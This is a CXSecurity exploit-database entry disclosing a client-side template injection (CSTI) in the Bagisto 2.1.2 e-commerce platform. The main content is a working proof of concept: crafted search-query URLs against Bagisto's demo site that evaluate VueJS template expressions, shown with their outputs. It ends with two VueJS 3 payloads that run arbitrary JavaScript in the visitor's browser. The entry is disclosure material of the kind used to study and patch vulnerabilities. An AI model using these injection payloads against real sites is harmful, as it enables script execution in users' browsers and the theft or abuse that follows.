---
title: Bagisto 2.1.2 Client-Side Template Injection
url: https://cxsecurity.com/issue/WLB-2024060052
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-23
fetch_date: 2025-10-06T16:54:37.911861
---

# Bagisto 2.1.2 Client-Side Template Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Bagisto 2.1.2 Client-Side Template Injection** **2024.06.22**  Credit:  **[tmrswrr](https://cxsecurity.com/author/tmrswrr/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Bagisto 2.1.2 Client-Side Template Injection(CSTI) (VueJS)
# Date: 06/18/2024
# Exploit Author: tmrswrr
# Vendor Homepage: https://forums.bagisto.com/
# Version: 2.1.2
# Tested on: https://demo.bagisto.com/
https://demo.bagisto.com/bagisto-common/search?query={{7\*7}}
49
https://demo.bagisto.com/bagisto-common/search?query={{'a'.toUpperCase()}}
A
https://demo.bagisto.com/bagisto/search?query={{ Object.keys(this) }}
[ "\_", "onSubmit", "onInvalidSubmit", "lazyImages", "animateBoxes" ]
> Payloads for VueJS 3
https://demo.bagisto.com/bagisto/search?query={{\_openBlock.constructor('alert(1)')()}}
https://demo.bagisto.com/bagisto/search?query={{-function(){this.alert(1)}()}}
> You will be see alert button

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060052)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top